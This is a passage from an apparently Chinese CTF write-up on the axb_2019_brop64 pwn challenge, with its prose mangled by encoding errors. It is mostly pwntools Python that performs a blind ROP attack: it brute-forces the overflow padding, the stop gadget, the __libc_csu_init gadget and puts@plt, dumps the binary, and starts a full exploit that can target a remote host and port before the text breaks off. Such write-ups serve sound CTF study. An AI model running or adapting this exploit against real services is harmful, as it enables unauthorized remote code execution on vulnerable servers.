me:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad</span></span><br><span class="line"><span class="string">Repeater:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad</span></span><br><span class="line"><span class="string">@Segmentation fault (core dumped)</span></span><br></pre></td></tr></table></figure><p>å­˜åœ¨æº¢å‡º</p><h3 id="ç¡®å®šåç§»é‡"><a href="#ç¡®å®šåç§»é‡" class="headerlink" title="ç¡®å®šåç§»é‡"></a>ç¡®å®šåç§»é‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Goodbye!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> sh.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_length=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> <span class="number">0</span>:</span><br><span class="line">    padding_length=Force_find_padding()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.............</span><br><span class="line">[+] Receiving all data: Done (237B)</span><br><span class="line">[*] Process <span class="string">&#x27;./axb_2019_brop64&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 23755)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./axb_2019_brop64&#x27;</span>: pid 23758</span><br><span class="line">[+] Receiving all data: Done (228B)</span><br><span class="line">[*] Process <span class="string">&#x27;./axb_2019_brop64&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 23758)</span><br><span class="line">[+] The <span class="literal">true</span> padding length is 216</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><h3 id="å¯»æ‰¾stop-gadget"><a href="#å¯»æ‰¾stop-gadget" class="headerlink" title="å¯»æ‰¾stop gadget"></a>å¯»æ‰¾<code>stop gadget</code></h3><p>æ­¤å¤„æˆ‘ä»¬å¸Œæœ›æˆ‘ä»¬èƒ½å¤Ÿçˆ†ç ´å‡ºmainå‡½æ•°çš„é¦–åœ°å€ï¼Œè¿›è€Œç›´æ¥è®©ç¨‹åºå›åˆ°mainå‡½æ•°è¿›è¡Œæ‰§è¡Œã€‚é¦–å…ˆæ­¤å¤„æˆ‘ä»¬å¯ä»¥å…ˆæ³„éœ²åŸæ¥çš„è¿”å›åœ°å€ï¼Œè¿›è€Œç¼©å°çˆ†ç ´èŒƒå›´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">old_return_addr=null</span><br><span class="line"><span class="keyword">if</span> old_return_addr <span class="keyword">is</span> null:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">    old_return_addr=u64(sh.recvuntil(<span class="string">&#x27;Goodbye!&#x27;</span>).strip(<span class="string">&#x27;Goodbye!&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;The old return address is &#x27;</span>+ <span class="built_in">hex</span>(old_return_addr))</span><br><span class="line"><span class="comment"># [*] The old return address is 0x400834</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥çˆ†ç ´è„šæœ¬(0x0000-0xffff)ï¼š</p><p>è¿™é‡Œå·²ç»çŸ¥é“ç»“æœæ‰€ä»¥ä¸ºäº†æ–¹ä¾¿ä»0x7d0å¼€å§‹æçš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_stop_gadget</span>(<span class="params">old_return_addr,padding_length</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x07d0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length + p16(maybe_low_byte))</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(<span class="string">&quot;We found a stop gadget is &quot;</span> + <span class="built_in">hex</span>(old_return_addr+maybe_low_byte))</span><br><span class="line">                <span class="keyword">return</span> (old_return_addr+padding_length)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line">Find_stop_gadget(old_return_addr,padding_length)</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./axb_2019_brop64&#x27;</span>: pid 32243</span><br><span class="line">[+] Receiving all data: Done (400B)</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./axb_2019_brop64&#x27;</span> (pid 32243)</span><br><span class="line">[+] We found a stop gadget is 0x4007d6</span><br><span class="line">gwt@ubuntu:~/Desktop$ </span><br></pre></td></tr></table></figure><h3 id="å¯»æ‰¾BROP-gadget"><a href="#å¯»æ‰¾BROP-gadget" class="headerlink" title="å¯»æ‰¾BROP gadget"></a>å¯»æ‰¾<code>BROP gadget</code></h3><p>æ ¹æ®<code>__libc_csu_init</code>ï¼Œåˆ©ç”¨çš„payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">payload += p64(libc_csu_init_address) </span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>libc_csu_init_address</code>æ˜¯pop rbxï¼Œé‚£ä¹ˆç¨‹åºä¼šä»stop_gadgeté‡æ–°æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_brop_gadget</span>(<span class="params">libc_csu_init_address_maybe,padding_length,stop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(libc_csu_init_address_maybe+maybe_low_byte) </span><br><span class="line">            payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">            payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a brop gadget is &quot;</span> + <span class="built_in">hex</span>(</span><br><span class="line">                        libc_csu_init_address_maybe+maybe_low_byte</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (libc_csu_init_address_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line">brop_gadget=Find_brop_gadget(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget)</span><br><span class="line"><span class="comment">#0x40095A</span></span><br></pre></td></tr></table></figure><h3 id="å¯»æ‰¾puts-plt"><a href="#å¯»æ‰¾puts-plt" class="headerlink" title="å¯»æ‰¾puts@plt"></a>å¯»æ‰¾puts@plt</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_func_plt</span>(<span class="params">func_plt_maybe,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0600</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">            payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">            payload += p64(func_plt_maybe+maybe_low_byte)</span><br><span class="line">            payload += p64(stop_gadget)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ELF&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a function plt address is &quot;</span> + <span class="built_in">hex</span>(func_plt_maybe+maybe_low_byte)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (func_plt_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line">func_plt=Find_func_plt(old_return_addr &amp; <span class="number">0xFFF000</span>,padding_length,stop_gadget,brop_gadget)</span><br><span class="line"><span class="comment"># func_plt=0x400635</span></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨puts-pltï¼ŒDumpæºæ–‡ä»¶"><a href="#åˆ©ç”¨puts-pltï¼ŒDumpæºæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨puts@pltï¼ŒDumpæºæ–‡ä»¶"></a>åˆ©ç”¨puts@pltï¼ŒDumpæºæ–‡ä»¶</h3><p>æˆ‘dumpä¸å‡ºæ¥ã€‚ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_file</span>(<span class="params">func_plt,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    process_old_had_received_length=<span class="number">0</span></span><br><span class="line">    process_now_had_received_length=<span class="number">0</span></span><br><span class="line">    file_content=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">                payload  = <span class="string">&#x27;A&#x27;</span> * (padding_length - <span class="built_in">len</span>(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span>))</span><br><span class="line">                payload += <span class="string">&#x27;Begin_leak-----&gt;&#x27;</span></span><br><span class="line">                payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">                payload += p64(<span class="number">0x400000</span>+process_now_had_received_length)</span><br><span class="line">                payload += p64(func_plt)</span><br><span class="line">                payload += p64(stop_gadget)</span><br><span class="line">                sh.send(payload)</span><br><span class="line">                sh.recvuntil(<span class="string">&#x27;Begin_leak-----&gt;&#x27;</span> + p64(brop_gadget+<span class="number">9</span>).strip(<span class="string">&#x27;x00&#x27;</span>))</span><br><span class="line">                received_data = sh.recvuntil(<span class="string">&#x27;x0AHello&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(received_data) == <span class="number">0</span> :</span><br><span class="line">                    file_content += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                    process_now_had_received_length += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    file_content += received_data</span><br><span class="line">                    process_now_had_received_length += <span class="built_in">len</span>(received_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> process_now_had_received_length == process_old_had_received_length :</span><br><span class="line">                log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(process_old_had_received_length) +<span class="string">&#x27; byte file!&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_brop64_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">                    fout.write(file_content)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            process_old_had_received_length = process_now_had_received_length</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Goodbye!&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> sh.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            sh.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_stop_gadget</span>(<span class="params">old_return_addr,padding_length</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            sh.send(<span class="string">&#x27;A&#x27;</span> * padding_length + p16(maybe_low_byte))</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(<span class="string">&quot;We found a stop gadget is &quot;</span> + <span class="built_in">hex</span>(old_return_addr+maybe_low_byte))</span><br><span class="line">                <span class="keyword">return</span> (old_return_addr+padding_length)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_brop_gadget</span>(<span class="params">libc_csu_init_address_maybe,padding_length,stop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(libc_csu_init_address_maybe+maybe_low_byte) </span><br><span class="line">            payload += p64(<span class="number">0</span>) * <span class="number">6</span> </span><br><span class="line">            payload += p64(stop_gadget) + p64(<span class="number">0</span>) * <span class="number">10</span></span><br><span class="line">            sh.send(payload)</span><br><span class="line">            <span class="keyword">if</span> maybe_low_byte &gt; <span class="number">0xFFFF</span>:</span><br><span class="line">                log.error(<span class="string">&quot;All low byte is wrong!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> sh.recvall(timeout=<span class="number">1</span>):</span><br><span class="line">                log.success(</span><br><span class="line">                    <span class="string">&quot;We found a brop gadget is &quot;</span> + <span class="built_in">hex</span>(</span><br><span class="line">                        libc_csu_init_address_maybe+maybe_low_byte</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> (libc_csu_init_address_maybe+maybe_low_byte)</span><br><span class="line">            maybe_low_byte=maybe_low_byte+<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Find_func_plt</span>(<span class="params">func_plt_maybe,padding_length,stop_gadget,brop_gadget</span>):</span></span><br><span class="line">    maybe_low_byte=<span class="number">0x0600</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = get_sh()</span><br><span class="line">            sh.recvuntil(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">            payload  = <span class="string">&#x27;A&#x27;</span> * padding_length </span><br><span class="line">            payload += p64(brop_gadget+<span class="number">9</span>) <span class="comment"># pop rdi;ret;</span></span><br><span class="line">            payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">            payload += 